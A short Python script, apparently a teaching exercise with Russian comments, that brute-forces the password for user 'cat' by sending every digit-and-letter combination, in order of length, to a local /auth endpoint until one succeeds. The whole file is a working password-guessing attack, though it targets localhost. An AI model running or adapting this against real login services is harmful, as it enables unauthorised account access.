import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz' # сократили
base = len(alphabet)

n = 0
length = 0

while True:
    # перевод n в 16-ричную систему Test!
    password = ''
    temp = n
    while len(password) < length:
        rest = temp % base
        temp = temp // base
        password = alphabet[rest] + password
    print(length, n, password)

    # Атакуем!
    response = requests.post(
        'http://127.0.0.1:5000/auth',
        json={'login': 'cat', 'password': password}
    )

    if response.status_code == 200:
        print('SUCCESS', password)
        break

    if password == alphabet[-1] * length:  # перебрали все пароли длины length:
        length += 1
        n = 0
    else:
        n += 1
